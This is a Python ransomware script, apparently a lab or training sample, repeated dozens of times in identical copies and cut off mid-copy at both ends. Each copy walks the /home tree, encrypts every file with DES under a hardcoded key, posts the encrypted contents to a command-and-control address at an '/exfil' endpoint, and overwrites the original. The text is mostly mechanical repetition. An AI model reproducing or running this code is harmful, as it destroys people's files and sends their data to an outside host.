    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
